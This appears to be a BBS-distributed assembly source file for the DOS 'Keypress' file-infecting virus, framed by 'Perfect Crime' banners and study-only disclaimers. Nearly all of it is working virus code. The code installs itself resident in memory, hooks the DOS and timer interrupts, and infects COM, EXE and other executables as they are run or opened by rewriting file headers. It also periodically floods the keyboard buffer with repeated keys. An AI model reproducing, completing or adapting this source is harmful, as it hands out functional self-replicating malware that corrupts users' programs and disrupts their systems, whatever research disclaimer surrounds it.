;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;********************************************************
; Source code of the Keypress Virus - Made by XSTC
; Made in A86 v3.07
;
; The Keypress Virus installs itself in top of DOS
; memory, without using DOS resident functions. It will
; hook int 1Ch (timer) and 21h (DOS) and will copy every
; 10 minutes during 2 seconds the keys you press five
; times (so if you press '1' it will be '111111') - if
; you press no key, it will usually give ESCs.
;
; In DOS 3+ it spreads to every file executed - so it
; can, besides COM/EXE, infect DRV/OVL/etc.
; It also spreads itself in DOS 1 and 2 with a special
; routine - in this case only COM/EXE files will be
; infected.
;
; It adds, after making full paragraphs of the file
; length, 1232 bytes to COM-files and 1216 to EXE.
;
; This code is only made to show the possibilities and
; dangers of a virus. It is only intended for research
; purposes - spreading a virus is prohibited by law.
;
; NOTE - The compiled code is not 100% compatible with
; the Keypress virus. A86 compiles the 'ADD BX,AX' and
; 'MOV DI,SI' different. This has totally no effect
; on the program.
;********************************************************

; After compiling the new virus, enter the new size in paragraphs in VirParSize
; and compile again.

VirParSize    equ 4Ch                      ; Size of the original KeyPress virus

VirStart:     jmp long VirBegin
              db 0

ComStart:     mov bx,cs               ; When the virus has infected a .COM file,
              add bx,[102h]           ; this is the jump to the virus. Actually,
              push bx                   ; this code is overwritten with the code
              mov bx,offset VirBegin                  ; in the end of the virus.
              push bx
              retf

EB02          dw 02EBh                  ; 'jmp 104' - first 2 bytes in .COM file

VirSize       dw VirParSize shl 4                  ; Size of virus in whole pars

VirPars       dw VirParSize + 1                        ; Size of virus in pars+1

MaxComSize    dw 0FF00h-VirParSize  ; Max. size .COM file to infect (100h stack)

Com_or_exe    db 00h                                ; 0 = Com-File, 1 = Exe-File
R_Ax          dw (?)
R_Bx          dw (?)
R_Cx          dw (?)
R_Dx          dw (?)
R_Di          dw (?)
R_Si          dw (?)
R_Bp          dw (?)
R_Es          dw (?)
R_Ds          dw (?)
R_SS          dw (?)
R_SP          dw (?)

Exe_CS        dw (?)
Exe_IP        dw (?)


VirBegin:     call Save_Regs                                    ; Start of virus
              call Fix_cs_ss      ; Fix CS and SS of orig. prog (for .EXE files)
              call Get_cs_ip                    ; Get CS and IP of original prog
              call Check_res                      ; Check virus already resident
              jb Exit_inst                                           ; Yes, quit

              call Inst_mem                                  ; Install in memory
              jb Exit_inst                                         ; Error, quit

              call Inst_ints                                   ; Hook interrupts
Exit_Inst:    jmp short Rst_regs_prg
              nop

Jmp_Prg:      db 0EAh                                 ; Jump to original program
PrgOfs        dw (?)
PrgSeg        dw (?)

Check_res:    push ds
              xor bx,bx
              mov ds,bx
              mov bx,600h                                ; Unused word in memory
              cmp word ptr [bx],1                           ; Already installed?
              jz Installed                                                 ; Yes

              mov word ptr [bx],1                                           ; No
              stc

Installed:    cmc
              pop ds
              ret


;*** For .EXE: Fix orig-prog CS and SS ***

Fix_cs_ss:    test byte ptr [Com_or_exe],1
              jz no_exe

              mov ax,es
              add ax,10h
              add Exe_cs,ax
              add R_ss,ax

No_Exe:       ret


;*** Get CS + IP of orig. program, and for .COM: Restore first 16 bytes ***

Get_cs_ip:    mov ax,[Exe_cs]
              mov bx,[Exe_ip]
              test byte ptr [Com_or_exe],1
              jnz No_rest                 ; .EXE file: no restore of first bytes

              mov ax,es
              mov bx,100h
              mov cx,10h
              mov si,offset First_bytes
              mov di,100h
              cld
              repz                          ; Restore first 16 bytes (.COM file)
              movsb

No_rest:      mov [Prgseg],ax
              mov [Prgofs],bx
              ret


;*** Proc: Save the registers to restore them after the virus has ended ***

Save_Regs:    mov cs:R_ds,ds
              push cs
              pop ds
              mov R_ax,ax
              mov R_bx,bx
              mov R_cx,cx
              mov R_dx,dx
              mov R_di,di
              mov R_si,si
              mov R_bp,bp
              mov R_es,es
              ret


;*** Restore regs for original program ***

Rst_regs_prg: mov ax,R_ax
              mov bx,R_bx
              mov cx,R_cx
              mov dx,R_dx
              mov bp,R_bp
              mov di,R_di
              mov si,R_si
              mov es,R_es
              test byte ptr [Com_or_exe],1
              jz No_StackRest                  ; No stack restore for .COM files

              cli
              mov ss,[R_ss]                                 ; Restore .EXE stack
              mov sp,[R_sp]
              sti

No_StackRest: mov ds,R_ds
              jmp short jmp_prg


;*** Restore regs for interrupts ***

Rst_regs_int: mov ax,R_ax
              mov bx,R_bx
              mov cx,R_cx
              mov dx,R_dx
              mov bp,R_bp
              mov di,R_di
              mov si,R_si
              mov es,R_es
              mov ds,R_ds
              ret


;*** Proc: Search for last MCB ***

Last_MCB:     push ds
              mov bx,es
              dec bx

Next_MCB:     mov ds,bx
              cmp byte ptr [0],5Ah                                   ; Last MCB?
              jz Is_last                                                   ; Yes
              inc bx
              add bx,[3]                                            ; Go to next
              cmp bx,0A000h                                            ; In ROM?
              jb Next_MCB                                     ; No, try next one

Is_Last:      pop ds
              ret


;*** Proc: Install virus in end of memory ***

Inst_Mem:     call Last_mcb                                    ; Search last MCB
              cmp bx,0A000h                                            ; In ROM?
              jb Not_ROM                                          ; No, continue

No_Inst:      push cs                                                ; Yes, quit
              pop ds
              stc                                   ; Error, virus not installed
              ret

Not_ROM:      mov ds,bx
              mov ax,[3]                                    ; AX = Size last MCB
              sub ax,cs:[VirPars]                      ; - (Virussize in pars+1)
              jbe no_inst                              ; Not enough memory, quit
              cmp ax,800h
              jb no_inst                        ; Less than 2048 pars free, quit
              mov [3],ax              ; Give program less space to install virus
              add bx,ax
              inc bx                                ; BX = seg where virus comes
              mov es:[2],bx            ; Enter in PSP, program not allowed there
              sub bx,10h                     ; - 10h pars (virus starts at 100h)
              push bx
              push cs
              pop ds
              pop es
              mov si,100h
              mov di,si
              mov cx,[VirSize]                                  ; CX = virussize
              cld
              repz                                 ; Copy virus to virus-segment
              movsb
              clc                                    ; No error, virus installed
              ret


;*** Install new interrupts (1C - Timer Tick, 21 - DOS) ***

Inst_Ints:    push es
              pop ds
              mov word ptr [Ticks],0
              mov ax,351Ch                                 ; Get Addr Timer Tick
              int 21h
              mov I1c_ofs,bx
              mov I1c_seg,es
              mov ax,3521h                                    ; Get Addr DOS-Int
              int 21h
              mov I21_ofs,bx
              mov I21_seg,es
              mov ax,251Ch
              mov dx,offset New_I1c
              int 21h                               ; Install New Timer-Tick Int
              mov dx,offset I21_dos12
              push dx
              mov ah,30h                                       ; Get DOS-Version
              int 21h
              pop dx
              cmp al,3                                              ; Below 3.0?
              jb DosBel3
              mov dx,offset new_I21                                ; No, new int
DosBel3:      mov ax,2521h                                 ; Install new DOS-Int
              int 21h
              push cs
              pop ds
              ret


;*** Proc: NEW 1C (TIMER TICK) INTERRUPT ***
; Every 10 minutes this routine sends during 2 sec. 180 extra keys to the
; keyboard-interrupt.

Ticks         dw (?)

New_I1c:      inc word ptr cs:[Ticks]     ; Increment 'Ticks after virus loaded'
              cmp word ptr cs:[Ticks],2A30h                 ; 10 minutes passed?
              jb org_I1c                                   ; No, go to orig. I1c
              cmp word ptr cs:[Ticks],2A54h                     ; 2 sec. passed?
              jbe screw_keys                                ; Not yet, give ESCs
              mov word ptr cs:[Ticks],0                      ; Time-counter to 0
              jmp short Org_I1c                                ; Go to orig. I1c
Screw_Keys:   push cx
              mov cx,5                                          ; 5 times / tick
Put_Key:      int 9                                             ; Give extra key
              loop Put_key
              pop cx
Org_I1c:      db 0EAh                                    ; Jump far to orig. I1c
I1c_Ofs       dw (?)
I1c_Seg       dw (?)

New_I24:      mov al,0

New_I23:      iret

I23_Ofs       dw (?)
I23_Seg       dw (?)

I24_Ofs       dw (?)
I24_Seg       dw (?)

ProgSize      dw (?)                                ; Program size in paragraphs

New_I21:      cmp ax,4B00h                             ; New DOS Int for DOS 3 +
              jz Is_Start
              jmp far dword ptr cs:[I21_Ofs]                    ; Jmp orig. I 21
Is_Start:     call Save_Regs
              call InstCritInt               ; Install new ^c and crit. err. int
              mov ax,3D02h                        ; Open file for read and write
              mov ds,R_Ds
              int 21h
              push cs
              pop ds
              jc Close_File
              mov bx,ax
              call Read_header
              jc Close_File
              call Write_virus
              jc Close_File
              call Write_header
Close_File:   mov ah,3Eh                                            ; Close file
              int 21h
              call RestCritInt                    ; Restore ^c and crit-err ints
              call Rst_regs_int
              jmp far dword ptr cs:[I21_Ofs]

I21_Dos12:    cmp ah,3Dh                       ; New DOS-Int for DOS 1.x and 2.x
              jz Is_Open

JmpDos:       db 0EAh                                                 ; Jump Far
I21_Ofs       dw (?)
I21_Seg       dw (?)

Is_Open:      push ax                                           ; Network-flags?
              and al,0FCh
              pop ax
              jnz JmpDos                                            ; Yes -> DOS

              call Save_Regs

              call InstCritInt               ; Install new ^c and crit. err. int

              mov DS,R_Ds
              or al,2                                             ; Write access
              pushf
              cli
              call far cs:[I21_Ofs]                                  ; Open file
              push cs
              pop ds
              jc Open_Error                               ; Error opening -> DOS

              pushf
              mov [R_Ax],ax                                        ; Save handle
              mov bx,ax

              call Chk_Inf                         ; Check infection is possible
              jc No_Infect                                          ; No -> quit

              call Read_header
              jc No_Infect

              call Write_virus
              jc No_Infect
              call Write_header
No_Infect:    call Go_file_beg                             ; Go to begin of file
              call RestCritInt                    ; Restore ^c and crit-err ints
              call Rst_regs_int
              popf
              retf 2
Open_Error:   call RestCritInt                    ; Restore ^c and crit-err ints
              call Rst_regs_int
              jmp short JmpDos


;*** Proc: Buffer for header of program to infect ***

Head_buf      dw 0Ch dup (?)


;*** Proc: Install new ^C and crit. err. interrupt ***

InstCritInt:  push ax
              push bx
              push dx
              push ds
              push es
              push cs
              pop ds
              mov ax,3523h                             ; Get Ctrl-Break Int Addr
              int 21h
              mov I23_Ofs,bx
              mov I23_Seg,es
              mov ax,3524h                              ; Get Crit. Err Int Addr
              int 21h
              mov I24_Ofs,bx
              mov I24_Seg,es
              mov ax,2523h
              mov dx,offset New_I23                 ; Install new Ctrl-Break Int
              int 21h
              mov ax,2524h                           ; Install new Crit. Err Int
              mov dx,offset New_I24
              int 21h
              pop es
              pop ds
              pop dx
              pop bx
              pop ax
              ret


;*** Proc: Restore orig. ctrl-break and crit. err. interrupt ***

RestCritInt:  mov ax,2524h                           ; Rest. orig. crit. err int
              lds dx,dword ptr cs:[I24_Ofs]
              int 21h
              mov ax,2523h                          ; Rest. orig. ctrl-break int
              lds dx,dword ptr cs:[I23_Ofs]
              int 21h
              push cs
              pop ds
              ret


;*** Read header of file ***

Read_header:  mov ah,3Fh
              mov dx,offset Head_buf
              mov cx,18h
              int 21h
              jc HeadRead_Err                      ; Error reading, don't infect

              call Check_infect ; Check file already infected; if not, save data
              jc HeadRead_Err                                      ; Error, quit

              call Calc_data                  ; Calculate data for infected file
              jc HeadRead_Err                                      ; Error, quit

HeadRead_Err: ret


;*** Proc: Write virus, and for .COM files, write first 16 bytes behind virus ***

Write_virus:  mov ah,40h                            ; Write virus behind program
              mov cx,[VirSize]
              mov dx,100h
              int 21h
              jc Err_Writ                                    ; Write error, quit
              cmp ax,cx
              jnz Err_Writ                                   ; '   ' '   '  '  '
              test byte ptr [Com_or_exe],1
              jz First_Write
              ret

First_Write:  mov ah,40h                 ; Write orig. 1st 16 bytes behind virus
              mov cx,10h
              mov dx,offset Head_buf
              int 21h
              jc Err_Writ                                    ; Write error, quit
              cmp ax,cx
              jnz Err_Writ                                   ; '   ' '   '  '  '
              clc                                      ; End procedure, no error
              ret

Err_Writ:     stc                                         ; End procedure, error
              ret


;*** Proc: .COM: Write jump-to-virus, .EXE: Write header ***

Write_header: call Go_file_beg                             ; Go to begin of file
              test byte ptr [Com_or_exe],1                          ; .EXE-file?
              jnz Exe_header
              mov ah,40h                             ; .COM file - Write 'EB 02'
              mov cx,2
              mov dx,offset EB02
              int 21h
              mov ah,40h                            ; Write program-size in pars
              mov cx,2
              mov dx,offset ProgSize
              int 21h
              mov ah,40h                          ; Write rest of begin of virus
              mov cx,0Ch
              mov dx,104h
              int 21h
              ret

Exe_header:   mov ah,40h                                         ; Write in File
              mov cx,18h
              mov dx,offset Head_buf
              int 21h
              ret


;*** Proc: Change file pointer ***

Cng_file_ptr: mov ax,4200h
              int 21h
              ret


;*** Proc: Go to begin of file ***

Go_file_beg:  xor cx,cx                                        ; Filepointer = 0
              xor dx,dx
              call Cng_file_ptr                            ; Change File Pointer
              ret 


;*** Proc: Check file is already infected ***

Check_infect: mov si,104h
              mov di,offset Head_buf+4
              push cs
              pop es
              mov byte ptr [Com_or_exe],0                        ; Flag for .COM
              cmp word ptr [di-04],5A4Dh                              ; Is .EXE?
              jz Is_Exe
              mov cx,0Ch                                         ; No, .COM file
              cld
              repz                                           ; Already infected?
              cmpsb
              jnz Do_Infect                                            ; Not yet
Dont_Infect:  stc
              ret
Do_Infect:    clc
              ret
Is_Exe:       mov byte ptr [Com_or_exe],1                        ; Flag for .EXE
              mov cx,[offset Head_buf+14h]                        ; cx = Prog-IP
              cmp cx,offset VirBegin                           ; Same as Vir-IP?
              jz Dont_Infect                                         ; Yes, quit
              cmp word ptr [offset Head_buf+0Ch],0           ; Max extra pars=0?
              jz Dont_Infect                                         ; Yes, quit
              mov [Exe_ip],cx                                     ; Save prog-IP
              mov cx,[Head_buf+16h]
              mov [Exe_cs],cx                                     ; Save prog-cs
              mov cx,[Head_buf+0Eh]
              mov [R_ss],cx                                       ; Save prog-SS
              mov cx,[Head_buf+10h]
              mov [R_sp],cx                                       ; Save prog-SP
              jmp short Do_Infect


;*** Proc: Calculate data for infection ***

Calc_data:    mov ax,4202h                                           ; Go to EOF
              xor cx,cx
              xor dx,dx
              int 21h
              test al,0Fh         ; Size mod 16 = 0 (File is exact x paragraps)?
              jz No_par_add                            ; Yes, no extra par added
              add ax,10h                                         ; Add paragraph
              adc dx,0                                      ; Overflow -> Inc dx
              and ax,0FFF0h                                    ; Make paragraphs
No_par_add:   test byte ptr [Com_or_exe],1
              jnz Calc_exe
              or dx,dx
              jnz not_infect
              cmp ax,[maxcomsize]                                ; File too big?
              ja not_infect                                          ; Yes, quit
              cmp ax,[VirSize]                                 ; File too small?
              jbe Not_Infect                                         ; Yes, quit
              mov [ProgSize],ax                              ; Save program-size
              mov cl,4
              shr word ptr [ProgSize],cl                         ; In paragraphs
              mov dx,ax
              xor cx,cx
              call Cng_file_ptr                                      ; Go to EOF
              clc
              ret
Not_Infect:   stc
              ret

Calc_exe:     push ax
              push dx
              add ax,100h                                      ; 100 bytes stack
              adc dx,0                                       ; Overflow - inc dx
              mov cx,dx
              mov dx,ax
              call Cng_file_ptr                                      ; Go to EOF
              push bx
              add ax,[VirSize]                                  ; New exe-length
              adc dx,0
              mov bx,200h                                    ; For header: / 512
              div bx
              or dx,dx
              jz No_Correct
              inc ax          ; Files below 2.000.000h bytes - length correction
No_Correct:   mov [Head_buf+2],dx                         ; Save new file-length
              mov [Head_buf+4],ax                         ; '  ' ' ' '  ' '    '
              pop bx
              pop dx
              pop ax
              call Calc_cs_ss
              mov word ptr [Head_buf+10h],100h                    ; Prog-SP=100h
              mov word ptr [Head_buf+14h],offset VirBegin          ; Set prog-IP
              clc
              ret


;*** Proc: Calculate new CS and SS for .EXE file ***

Calc_cs_ss:   push cx
              mov cx,4
Cs_ss_lp:     shr dx,1
              rcr ax,1
              loop Cs_ss_lp
              sub ax,[Head_buf+8]                               ; Size of header
              sbb dx,0
              mov [Head_buf+0Eh],ax                               ; Save prog-SS
              mov [Head_buf+16h],ax                               ; Save prog-cs
              pop cx
              ret


;*** Check infection is possible ***

Chk_Inf:      call Chk_exec                           ; Check file is executable
              jb Not_exec
              call Get_attr                         ; Check file has no SYS attr
Not_Exec:     ret


;*** Search-paths ***

Com_path      db '.COM',0

Exe_path      db '.EXE',0


;*** Check file is executable (.COM / .EXE)

Chk_Exec:     push es
              mov es,R_ds
              mov di,dx
              xor al,al
              mov cx,80h
              cld
              repnz                                                 ; Search '.'
              scasb
              jnz not_inf                                         ; No '.' found
              dec di
              push di
              mov si,offset Com_path+4
              mov cx,4
              std
              repz                                                ; Check '.COM'
              cmpsb
              pop di
              jnz no_com                                               ; No .COM
              clc
              jmp short Infect
              nop
Not_Inf:      stc

Infect:       cld
              pop es
              ret
No_Com:       mov si,offset Exe_path+4
              mov cx,4
              repz                                                ; Check '.EXE'
              cmpsb
              jnz not_inf                      ; No .EXE either - not executable
              clc
              jmp short infect

Get_Attr:     push ds
              mov ax,4300h                                        ; Get FileAttr
              xor cx,cx
              mov ds,R_ds
              int 21h
              pop ds
              jb Bad_Attr                                 ; Error - don't infect
              test cx,4                                           ; System-Attr?
              jnz Bad_Attr                                   ; Yes, don't infect
              clc
              ret

Bad_Attr:     stc
              ret

First_bytes:  int 20h     ; First bytes of orig. program - here just 'Go to DOS'
              dw (?)
              mov bx,cs                                   ; Overwrites the begin
              add bx,[102h]
              push bx
              mov bx,offset VirBegin
              push bx
              retf

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
